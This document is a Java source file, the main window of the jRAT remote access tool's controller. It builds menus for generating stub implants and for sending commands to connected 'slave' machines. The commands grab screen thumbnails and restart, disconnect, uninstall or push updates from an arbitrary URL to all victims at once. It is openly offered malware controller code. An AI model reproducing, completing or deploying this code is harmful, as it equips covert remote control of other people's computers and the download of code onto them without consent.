package se.jrat.client.ui.frames;

import java.awt.Toolkit;
import java.awt.TrayIcon;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.List;

import javax.swing.ImageIcon;
import javax.swing.JCheckBoxMenuItem;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Constants;
import se.jrat.client.ErrorDialog;
import se.jrat.client.Globals;
import se.jrat.client.Main;
import se.jrat.client.SampleMode;
import se.jrat.client.Slave;
import se.jrat.client.UniqueId;
import se.jrat.client.Updater;
import se.jrat.client.addons.Plugin;
import se.jrat.client.addons.PluginLoader;
import se.jrat.client.net.WebRequest;
import se.jrat.client.packets.outgoing.Packet11Disconnect;
import se.jrat.client.packets.outgoing.Packet18Update;
import se.jrat.client.packets.outgoing.Packet36Uninstall;
import se.jrat.client.packets.outgoing.Packet37RestartJavaProcess;
import se.jrat.client.packets.outgoing.Packet40Thumbnail;
import se.jrat.client.packets.outgoing.Packet45Reconnect;
import se.jrat.client.settings.Settings;
import se.jrat.client.settings.SettingsColumns;
import se.jrat.client.ui.Columns;
import se.jrat.client.ui.components.DraggableTabbedPane;
import se.jrat.client.ui.dialogs.DialogEula;
import se.jrat.client.ui.panels.PanelMainClients;
import se.jrat.client.ui.panels.PanelMainLog;
import se.jrat.client.ui.panels.PanelMainNetwork;
import se.jrat.client.ui.panels.PanelMainOnConnect;
import se.jrat.client.ui.panels.PanelMainPlugins;
import se.jrat.client.ui.panels.PanelMainSockets;
import se.jrat.client.ui.panels.PanelMainStats;
import se.jrat.client.ui.renderers.table.PluginsTableRenderer;
import se.jrat.client.utils.IconUtils;
import se.jrat.client.utils.NetUtils;
import se.jrat.client.utils.Utils;
import se.jrat.common.Version;
import se.jrat.common.utils.DataUnits;
import se.jrat.common.utils.IOUtils;

@SuppressWarnings("serial")
public class Frame extends BaseFrame {

	public static final int PING_ICON_DOT = 0;
	public static final int PING_ICON_CIRCLE = 1;

	private JTabbedPane tabbedPane;

	private int pingMode;
	private boolean showThumbnails;
	private TrayIcon trayIcon;

	private PanelMainClients panelClients;
	private PanelMainStats panelStats;
	private PanelMainNetwork panelNetwork;
	private PanelMainOnConnect panelOnConnect;
	private PanelMainSockets panelSockets;
	private PanelMainLog panelLog;
	private PanelMainPlugins panelPlugins;

	private JMenu mnPlugins;
	private JCheckBoxMenuItem chckbxmntmTransferPluginsIf;

	public Frame() {
		super();
		setIconImage(Toolkit.getDefaultToolkit().getImage(Frame.class.getResource("/icons/icon.png")));
		setTitle(Main.formatTitle());
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 730, 450);

		JMenuBar menuBar = new JMenuBar();
		setJMenuBar(menuBar);

		JMenu mnMain = new JMenu("Main");
		menuBar.add(mnMain);

		JMenuItem mntmClientSettings = new JMenuItem("Settings");
		mntmClientSettings.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				new FrameSettings().setVisible(true);
			}
		});

		JMenuItem mntmAddSocket = new JMenuItem("Add Socket                ");
		mntmAddSocket.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameAddSocket frame = new FrameAddSocket();
				frame.setVisible(true);
			}
		});
		mntmAddSocket.setIcon(IconUtils.getIcon("socket-add"));
		mnMain.add(mntmAddSocket);

		if (Main.liteVersion) {
			mnMain.addSeparator();

			JMenuItem mntmUpgrade = new JMenuItem("Upgrade");
			mntmUpgrade.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					NetUtils.openUrl(WebRequest.domains[0] + "/purchase.php");
				}
			});
			mntmUpgrade.setIcon(IconUtils.getIcon("donate"));
			mnMain.add(mntmUpgrade);
		}
		mnMain.addSeparator();
		mntmClientSettings.setIcon(IconUtils.getIcon("toolbox"));
		mnMain.add(mntmClientSettings);
		mnMain.addSeparator();

		JMenu mnShow = new JMenu("Show");
		mnMain.add(mnShow);

		JCheckBoxMenuItem mntmShowshowThumbnails = new JCheckBoxMenuItem("Show Thumbnails");
		mnShow.add(mntmShowshowThumbnails);
		mntmShowshowThumbnails.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				showThumbnails = !showThumbnails;

				if (showThumbnails) {
					for (int i = 0; i < Main.connections.size(); i++) {
						AbstractSlave sl = Main.connections.get(i);
						if (sl.getThumbnail() == null) {
							if (sl instanceof Slave) {
								((Slave) sl).addToSendQueue(new Packet40Thumbnail());
							}
						}
					}
					panelClients.setRowHeight(100);
				} else {
					panelClients.resetRowHeight();
				}
			}
		});

		mnMain.addSeparator();

		JMenu mnServerModule = new JMenu("Stub Module");
		mnServerModule.setIcon(IconUtils.getIcon("bug"));
		mnMain.add(mnServerModule);
		mnMain.addSeparator();

		JMenuItem mntmBuildServer = new JMenuItem("Normal Builder");
		mntmBuildServer.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				new FrameBuildMinimal().setVisible(true);
			}
		});
		mntmBuildServer.setIcon(IconUtils.getIcon("info-button"));
		mnServerModule.add(mntmBuildServer);

		JMenuItem mntmAdvancedBuild = new JMenuItem("Advanced Builder");
		mntmAdvancedBuild.setEnabled(Main.isFeatureEnabled());
		mntmAdvancedBuild.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameBuildAdvanced frame = new FrameBuildAdvanced();
				frame.setVisible(true);
			}
		});
		mntmAdvancedBuild.setIcon(IconUtils.getIcon("info-button"));
		mnServerModule.add(mntmAdvancedBuild);

		JMenu mnKeys = new JMenu("Keys");
		mnMain.add(mnKeys);

		JMenuItem mntmImportKey = new JMenuItem("Import key");
		mnKeys.add(mntmImportKey);
		mntmImportKey.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JFileChooser chooser = new JFileChooser();
				chooser.showOpenDialog(null);

				File file = chooser.getSelectedFile();

				if (file != null) {
					try {
						FileInputStream fis = new FileInputStream(file);
						FileOutputStream fos = new FileOutputStream(new File(Globals.getFileDirectory(), "jrat.key"));
						IOUtils.copy(fis, fos);
						fis.close();
						fos.close();

						JOptionPane.showMessageDialog(null, "Imported key, please restart", "Import key", JOptionPane.WARNING_MESSAGE);
					} catch (Exception ex) {
						ex.printStackTrace();
						ErrorDialog.create(ex);
					}
				}
			}
		});
		mntmImportKey.setIcon(IconUtils.getIcon("key-arrow"));

		JMenuItem mntmGenerateKey = new JMenuItem("Generate key");
		mnKeys.add(mntmGenerateKey);
		mntmGenerateKey.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					File keyFile;

					int i = 0;

					do {
						i++;
						String s = i == 0 ? "" : Integer.toString(i);
						keyFile = Globals.getKeyFile(s);
					} while (keyFile.exists());

					FileOutputStream out = new FileOutputStream(keyFile);
					out.write(UniqueId.generateBinary());
					out.close();

					JOptionPane.showMessageDialog(null, "Generated a new key to jrat.key\nBackup this file and do not loose it", "Generate key", JOptionPane.INFORMATION_MESSAGE);
				} catch (Exception ex) {
					ex.printStackTrace();
					ErrorDialog.create(ex);
				}
			}
		});
		mntmGenerateKey.setIcon(IconUtils.getIcon("key-plus"));

		JMenu mnHelp = new JMenu("Help");
		mnMain.add(mnHelp);

		JMenuItem mntmEulamustRead = new JMenuItem("EULA (Must read)");
		mnHelp.add(mntmEulamustRead);
		mntmEulamustRead.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				DialogEula frame = new DialogEula(true);
				frame.setVisible(true);
			}
		});
		mntmEulamustRead.setIcon(IconUtils.getIcon("gavel"));

		JMenuItem mntmAProblemShow = new JMenuItem("A problem? Show help");
		mnHelp.add(mntmAProblemShow);
		mntmAProblemShow.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameHelp frame = new FrameHelp();
				frame.setVisible(true);
			}
		});
		mntmAProblemShow.setIcon(IconUtils.getIcon("info-button"));

		JMenuItem mntmTwitter = new JMenuItem("Twitter");
		mntmTwitter.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				NetUtils.openUrl("https://twitter.com/java_rat");
			}
		});
		mntmTwitter.setIcon(IconUtils.getIcon("twitter"));
		mnMain.add(mntmTwitter);

		mnMain.addSeparator();

		JMenuItem mntmExit = new JMenuItem("Exit");
		mntmExit.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Main.instance.setVisible(false);
				Main.instance.dispose();
				System.exit(0);
			}
		});

		JMenuItem mntmUpdate = new JMenuItem("Update");
		mntmUpdate.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Updater.runUpdater();
			}
		});
		mntmUpdate.setIcon(IconUtils.getIcon("update"));
		mnMain.add(mntmUpdate);
		mntmExit.setIcon(IconUtils.getIcon("exit"));
		mnMain.add(mntmExit);

		JMenu mnTools = new JMenu("Tools");
		menuBar.add(mnTools);

		JMenuItem mntmGarbageCollector = new JMenuItem("Garbage Collector");
		mntmGarbageCollector.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				long start = Runtime.getRuntime().freeMemory();
				System.gc();
				long end = Runtime.getRuntime().freeMemory();
				long result = end - start;
				String r = DataUnits.getAsString(result);
				JOptionPane.showMessageDialog(null, "Saved " + r + "  memory", "Garbage Collector", JOptionPane.INFORMATION_MESSAGE);
			}
		});

		JMenu mnLook = new JMenu("Look");
		mnLook.setIcon(IconUtils.getIcon("gui"));
		mnTools.add(mnLook);
		
		JMenu mnColumns = new JMenu("Columns");
		mnColumns.setIcon(IconUtils.getIcon("application-table"));
		mnTools.add(mnColumns);

		mnTools.addSeparator();

		JMenu mnPingIcon = new JMenu("Ping icon");
		mnLook.add(mnPingIcon);
		mnPingIcon.setIcon(IconUtils.getIcon("application-images"));

		JMenuItem mntmMeter = new JMenuItem("Meter");
		mntmMeter.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				setPingMode(Frame.PING_ICON_DOT);
				repaint();
			}
		});
		mntmMeter.setIcon(IconUtils.getIcon("ping0"));
		mnPingIcon.add(mntmMeter);

		JMenuItem mntmCircle = new JMenuItem("Circle");
		mntmCircle.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				setPingMode(Frame.PING_ICON_CIRCLE);
				repaint();
			}
		});
		mntmCircle.setIcon(IconUtils.getIcon("network-green"));
		mnPingIcon.add(mntmCircle);

		JMenu mnTabPlacement = new JMenu("Tab placement");
		mnLook.add(mnTabPlacement);
		mnTabPlacement.setIcon(IconUtils.getIcon("application-tabs"));

		JMenuItem mntmTop = new JMenuItem("Top");
		mntmTop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				tabbedPane.setTabPlacement(JTabbedPane.TOP);
			}
		});
		mntmTop.setIcon(IconUtils.getIcon("ui-tab"));
		mnTabPlacement.add(mntmTop);

		JMenuItem mntmBottom = new JMenuItem("Bottom");
		mntmBottom.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				tabbedPane.setTabPlacement(JTabbedPane.BOTTOM);
			}
		});
		mntmBottom.setIcon(IconUtils.getIcon("ui-tab-bottom"));
		mnTabPlacement.add(mntmBottom);

		JMenuItem mntmLeft = new JMenuItem("Left");
		mntmLeft.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				tabbedPane.setTabPlacement(JTabbedPane.LEFT);
			}
		});
		mntmLeft.setIcon(IconUtils.getIcon("ui-tab-side"));
		mnTabPlacement.add(mntmLeft);

		JMenuItem mntmRight = new JMenuItem("Right");
		mntmRight.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				tabbedPane.setTabPlacement(JTabbedPane.RIGHT);
			}
		});
		mntmRight.setIcon(IconUtils.getIcon("ui-tab-side-right"));
		mnTabPlacement.add(mntmRight);

		JMenu mnTableResizeBehaviour = new JMenu("Table resize behaviour");
		mnLook.add(mnTableResizeBehaviour);
		mnTableResizeBehaviour.setIcon(IconUtils.getIcon("application-table"));

		JMenuItem mntmResizeOff = new JMenuItem("Resize off");
		mntmResizeOff.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				panelClients.getTable().setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
			}
		});
		mntmResizeOff.setIcon(IconUtils.getIcon("application-resize"));
		mnTableResizeBehaviour.add(mntmResizeOff);

		JMenuItem mntmFit = new JMenuItem("Fit");
		mntmFit.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				panelClients.getTable().setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS);
			}
		});
		mntmFit.setIcon(IconUtils.getIcon("application-resize"));
		mnTableResizeBehaviour.add(mntmFit);

		JMenuItem mntmRowHeight = new JMenuItem("Row height");
		mnLook.add(mntmRowHeight);
		mntmRowHeight.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String str = Utils.showDialog("Input", "Input new row height. Default: 30");
				if (str == null) {
					return;
				}

				int h;

				try {
					h = Integer.parseInt(str.trim());
				} catch (Exception ex) {
					return;
				}
				panelClients.setRowHeight(h);
				Settings.getGlobal().setVal("rowheight", h);
			}
		});
		mntmRowHeight.setIcon(IconUtils.getIcon("application-dock"));

		JMenuItem mntmColors = new JMenuItem("Colors");
		mnLook.add(mntmColors);
		mntmColors.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameColors frame = new FrameColors();
				frame.setVisible(true);
			}
		});
		mntmColors.setIcon(IconUtils.getIcon("color-palette"));

		JMenuItem mntmGroups = new JMenuItem("Groups");
		mnTools.add(mntmGroups);
		mntmGroups.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameGroups frame = new FrameGroups();
				frame.setVisible(true);
			}
		});
		mntmGroups.setIcon(IconUtils.getIcon("group"));
		
				JMenuItem mntmReloadAllshowThumbnails = new JMenuItem("Reload all Thumbnails");
				mnTools.add(mntmReloadAllshowThumbnails);
				mntmReloadAllshowThumbnails.setIcon(IconUtils.getIcon("image"));
				mntmReloadAllshowThumbnails.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent arg0) {
						for (int i = 0; i < Main.connections.size(); i++) {
							AbstractSlave sl = Main.connections.get(i);
							if (sl instanceof Slave) {
								((Slave) sl).addToSendQueue(new Packet40Thumbnail());
							}
						}
					}
				});

		JMenuItem mntmSampleMode = new JMenuItem("Sample Mode");
		mnTools.add(mntmSampleMode);
		mntmSampleMode.setIcon(IconUtils.getIcon("camera"));
		mntmSampleMode.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (Utils.yesNo("Confirm", "This will break " + Constants.NAME + " until restarted and begin a photo friendly session")) {
					SampleMode.start(false);
				}
			}
		});
		mntmGarbageCollector.setIcon(IconUtils.getIcon("garbage"));
		mnTools.add(mntmGarbageCollector);

		JMenuItem mntmPerformance = new JMenuItem("Performance");
		mntmPerformance.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FramePerformance frame = new FramePerformance();
				frame.setVisible(true);
			}
		});
		mntmPerformance.setIcon(IconUtils.getIcon("meter"));
		mnTools.add(mntmPerformance);

		JMenu mnServers = new JMenu("Clients");
		menuBar.add(mnServers);

		JMenuItem mntmSelectAll = new JMenuItem("Select all");
		mntmSelectAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				selectAll();
			}
		});
		mntmSelectAll.setIcon(IconUtils.getIcon("select-all"));
		mnServers.add(mntmSelectAll);

		JMenuItem mntmSelectX = new JMenuItem("Select X");
		mntmSelectX.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (Main.connections.size() == 0) {
					return;
				}
				String howmany = Utils.showDialog("Select X", "Select how many clients you want to select\n" + Main.connections.size() + " available");
				if (howmany == null || howmany != null && howmany.length() == 0) {
					return;
				}
				int many;
				try {
					many = Integer.parseInt(howmany.trim());
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Invalid amount!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				if (many > Main.connections.size()) {
					JOptionPane.showMessageDialog(null, "Not enough clients connected", "Error", JOptionPane.WARNING_MESSAGE);
					return;
				}
				for (int i = 0; i < Main.connections.size() && i < many; i++) {
					Main.connections.get(i).setSelected(true);
				}
				repaint();
			}
		});
		mntmSelectX.setIcon(IconUtils.getIcon("select-x"));
		mnServers.add(mntmSelectX);

		JMenuItem mntmUnselectAll = new JMenuItem("Unselect all");
		mntmUnselectAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				unselectAll();
			}
		});
		mnServers.add(mntmUnselectAll);
		mnServers.addSeparator();

		JMenuItem mntmRestartAll = new JMenuItem("Restart all");
		mntmRestartAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				selectAll();
				List<AbstractSlave> list = panelClients.getSelectedSlaves();
				if (list.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm restarting all connections")) {
						for (AbstractSlave sl : list) {
							if (sl instanceof Slave) {
								try {
									((Slave) sl).addToSendQueue(new Packet37RestartJavaProcess());
								} catch (Exception ex) {
									ex.printStackTrace();
								}
							}
						}
					}
				}
			}
		});
		mntmRestartAll.setIcon(IconUtils.getIcon("refresh"));
		mnServers.add(mntmRestartAll);

		JMenuItem mntmDisconnectAll = new JMenuItem("Disconnect all");
		mntmDisconnectAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				selectAll();
				List<AbstractSlave> list = panelClients.getSelectedSlaves();
				if (list.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm disconnecting all connections")) {
						for (AbstractSlave sl : list) {
							if (sl instanceof Slave) {
								try {
									((Slave) sl).addToSendQueue(new Packet11Disconnect());
								} catch (Exception ex) {
									ex.printStackTrace();
								}
							}
						}
					}
				}
			}
		});

		JMenuItem mntmReconnectAll = new JMenuItem("Reconnect all");
		mntmReconnectAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				selectAll();
				List<AbstractSlave> list = panelClients.getSelectedSlaves();
				if (list.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm reconnecting all connections")) {
						for (AbstractSlave sl : list) {
							if (sl instanceof Slave) {
								try {
									((Slave) sl).addToSendQueue(new Packet45Reconnect());
								} catch (Exception ex) {
									ex.printStackTrace();
								}
							}
						}
					}
				}
			}
		});
		mntmReconnectAll.setIcon(IconUtils.getIcon("refresh-blue"));
		mnServers.add(mntmReconnectAll);
		mntmDisconnectAll.setIcon(IconUtils.getIcon("delete"));
		mnServers.add(mntmDisconnectAll);

		JMenuItem mntmUninstallAll = new JMenuItem("Uninstall all");
		mntmUninstallAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				selectAll();
				List<AbstractSlave> list = panelClients.getSelectedSlaves();
				if (list.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm uninstalling all connections")) {
						for (AbstractSlave sl : list) {
							if (sl instanceof Slave) {
								try {
									((Slave) sl).addToSendQueue(new Packet36Uninstall());
								} catch (Exception ex) {
									ex.printStackTrace();
								}
							}
						}
					}
				}
			}
		});
		mntmUninstallAll.setIcon(IconUtils.getIcon("exit"));
		mnServers.add(mntmUninstallAll);
		mnServers.addSeparator();

		JMenuItem mntmUpdateAllOutdated = new JMenuItem("Update all outdated (red)");
		mntmUpdateAllOutdated.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (Main.connections.size() == 0) {
					return;
				}
				
				String result = Utils.showDialog("Update from URL", "Input URL to update with");
				if (result == null) {
					return;
				}
				if (!NetUtils.isURL(result)) {
					JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
					return;
				}

				result = result.trim().replace(" ", "%20");

				int clients = 0;
				for (AbstractSlave slave : Main.connections) {
					if (slave instanceof Slave && !slave.getVersion().equals(Version.getVersion())) {
						((Slave) slave).addToSendQueue(new Packet18Update(result));
						++clients;
					}

				}
				JOptionPane.showMessageDialog(null, "Updated on " + clients + " outdated connections");
			}
		});
		mntmUpdateAllOutdated.setIcon(IconUtils.getIcon("update"));
		mnServers.add(mntmUpdateAllOutdated);

		mnPlugins = new JMenu("Plugins");
		menuBar.add(mnPlugins);

		JMenuItem mntmPlugins = new JMenuItem("View Installed Plugins");
		mnPlugins.add(mntmPlugins);
		mntmPlugins.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FramePlugins frame = new FramePlugins();
				frame.setVisible(true);
			}
		});
		mntmPlugins.setIcon(IconUtils.getIcon("plugin"));

		JMenuItem mntmPackPlugin = new JMenuItem("Pack Plugin");
		mnPlugins.add(mntmPackPlugin);
		mntmPackPlugin.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				new FramePackPlugin().setVisible(true);
			}
		});
		mntmPackPlugin.setIcon(IconUtils.getIcon("plugin-edit"));
		JMenuItem mntmBrowsePlugins = new JMenuItem("View Available Plugins");
		mnPlugins.add(mntmBrowsePlugins);

		chckbxmntmTransferPluginsIf = new JCheckBoxMenuItem("Transfer plugins if not installed");
		chckbxmntmTransferPluginsIf.setSelected(Settings.getGlobal().getBoolean("plugintransfer"));
		chckbxmntmTransferPluginsIf.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Settings.getGlobal().setVal("plugintransfer", chckbxmntmTransferPluginsIf.isSelected());
			}
		});
		mnPlugins.add(chckbxmntmTransferPluginsIf);
		mnPlugins.addSeparator();

		mntmBrowsePlugins.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameInstallPlugins frame = new FrameInstallPlugins();
				frame.setVisible(true);
			}
		});
		mntmBrowsePlugins.setIcon(IconUtils.getIcon("application-images"));
		mntmBrowsePlugins.setEnabled(Main.isFeatureEnabled());

		JMenu mnAbout = new JMenu("Help");
		mnAbout.setVisible(true);
		menuBar.add(mnAbout);

		JMenuItem menuItem = new JMenuItem("About " + Constants.NAME + " " + Version.getVersion());
		menuItem.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameAbout frame = new FrameAbout();
				frame.setVisible(true);
			}
		});

		JMenuItem mntmWhatsNewIn = new JMenuItem("Whats new in " + Version.getVersion());
		mntmWhatsNewIn.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					FrameChangelog frame = new FrameChangelog(WebRequest.getUrl(Constants.HOST + "/api/changelog.php"), Version.getVersion());
					frame.setVisible(true);
				} catch (Exception ex) {
					ex.printStackTrace();
					ErrorDialog.create(ex);
				}
			}
		});
		mntmWhatsNewIn.setIcon(IconUtils.getIcon("question"));
		mnAbout.add(mntmWhatsNewIn);

		JMenuItem mntmDebugerrorReportInfo = new JMenuItem("Debug/Error Report Info");
		mntmDebugerrorReportInfo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameDebugInfo debug = new FrameDebugInfo();
				debug.setVisible(true);
			}
		});
		mntmDebugerrorReportInfo.setIcon(IconUtils.getIcon("java"));
		mnAbout.add(mntmDebugerrorReportInfo);
		mnAbout.addSeparator();
		menuItem.setIcon(IconUtils.getIcon("info"));
		mnAbout.add(menuItem);

		tabbedPane = new DraggableTabbedPane(JTabbedPane.TOP);
		tabbedPane.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent arg0) {
				panelStats.setActive(tabbedPane.getTitleAt(tabbedPane.getSelectedIndex()).equals("Statistics"));
				panelNetwork.setActive(tabbedPane.getTitleAt(tabbedPane.getSelectedIndex()).equals("Network Usage"));
			}
		});
		

		panelClients = new PanelMainClients();
		panelStats = new PanelMainStats();
		panelNetwork = new PanelMainNetwork();
		panelOnConnect = new PanelMainOnConnect();
		panelSockets = new PanelMainSockets();
		panelLog = new PanelMainLog();
		panelPlugins = new PanelMainPlugins();

		tabbedPane.addTab("Clients", IconUtils.getIcon("tab-main", true), panelClients, null);
		tabbedPane.addTab("Statistics", IconUtils.getIcon("statistics", true), panelStats, null);
		tabbedPane.addTab("Network Usage", IconUtils.getIcon("network"), panelNetwork, null);
		tabbedPane.addTab("On Connect", IconUtils.getIcon("calendar", true), panelOnConnect, null);
		tabbedPane.addTab("Sockets", IconUtils.getIcon("sockets"), panelSockets, null);
		tabbedPane.addTab("Log", IconUtils.getIcon("log"), panelLog, null);
		tabbedPane.addTab("Plugins", IconUtils.getIcon("plugin"), panelPlugins, null);
		
		for (Columns s : Columns.values()) {
			JCheckBoxMenuItem jcb = new JCheckBoxMenuItem("Display " + s.getName());
			jcb.setSelected(SettingsColumns.getGlobal().isSelected(s.getName()));
			jcb.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					JCheckBoxMenuItem jcb = (JCheckBoxMenuItem) e.getSource();
					
					String text = jcb.getText().substring(8, jcb.getText().length());
					
					if (jcb.isSelected()) {
						panelClients.getColumns().add(text);
					} else {
						panelClients.getColumns().remove(text);
					}
					
					SettingsColumns.getGlobal().setColumn(text, jcb.isSelected());
					
					panelClients.reloadTable();
				}	
			});
			
			mnColumns.add(jcb);
		}

		reloadPlugins();

		getContentPane().add(tabbedPane);
	}

	public void reloadPlugins() {
		while (mnPlugins.getComponentCount() >= 4) {
			mnPlugins.remove(4);
		}
		if (PluginLoader.plugins.size() == 0) {
			JMenuItem item = new JMenuItem("No plugins loaded");
			item.setEnabled(false);
			mnPlugins.add(item);
		}

		for (int i = 0; i < PluginLoader.plugins.size(); i++) {
			final Plugin p = PluginLoader.plugins.get(i);

			JMenuItem item = new JMenuItem(p.getName());

			ActionListener listener = p.getGlobalItemListener();

			if (listener != null) {
				item.addActionListener(listener);
			} else {
				item.addActionListener(new ActionListener() {
					@Override
					public void actionPerformed(ActionEvent e) {
						JOptionPane.showMessageDialog(null, "Name: " + p.getName() + "\nVersion: " + p.getVersion() + "\nAuthor: " + p.getAuthor() + "\nDescription: " + p.getDescription(), "Plugin Description", JOptionPane.INFORMATION_MESSAGE);
					}
				});
			}

			File iconFile = new File(Globals.getPluginDirectory(), p.getName().replace(" ", "") + "/icon.png");

			if (iconFile.exists()) {
				item.setIcon(new ImageIcon(iconFile.getAbsolutePath()));
			} else {
				item.setIcon(PluginsTableRenderer.PLUGIN_ICON);
			}

			mnPlugins.add(item);
		}

		panelPlugins.reload();
	}

	public void unselectAll() {
		for (int i = 0; i < Main.connections.size(); i++) {
			Main.connections.get(i).setSelected(false);
		}
		repaint();
	}

	public void selectAll() {
		for (int i = 0; i < Main.connections.size(); i++) {
			Main.connections.get(i).setSelected(true);
		}
		repaint();
	}

	public PanelMainClients getPanelClients() {
		return panelClients;
	}

	public PanelMainStats getPanelStats() {
		return panelStats;
	}

	public PanelMainNetwork getPanelNetwork() {
		return panelNetwork;
	}

	public PanelMainSockets getPanelSockets() {
		return panelSockets;
	}

	public PanelMainOnConnect getPanelOnConnect() {
		return panelOnConnect;
	}

	public JTabbedPane getTabbedPane() {
		return tabbedPane;
	}

	public PanelMainLog getPanelLog() {
		return panelLog;
	}

	public PanelMainPlugins getPanelPlugins() {
		return panelPlugins;
	}

	public boolean showThumbnails() {
		return showThumbnails;
	}

	public TrayIcon getTrayIcon() {
		return trayIcon;
	}

	public void setTrayIcon(TrayIcon trayIcon) {
		this.trayIcon = trayIcon;
	}

	public int getPingMode() {
		return pingMode;
	}

	public void setPingMode(int pingMode) {
		this.pingMode = pingMode;
	}
}